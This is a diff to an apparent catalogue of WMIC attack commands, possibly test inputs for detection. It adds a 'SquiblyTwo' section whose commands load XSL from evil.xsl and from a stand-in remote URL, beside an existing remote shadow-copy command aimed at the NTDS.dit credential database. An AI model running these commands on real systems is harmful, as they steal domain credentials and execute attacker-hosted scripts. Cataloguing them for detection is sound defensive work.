@@ -43,3 +43,13 @@ Input:
 Input:
 
     wmic /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"
+
+### SquiblyTwo
+
+Input:
+
+    wmic process list /FORMAT:evil.xsl
+
+Input:
+
+    wmic os get /FORMAT:”https:///evil.xsl”
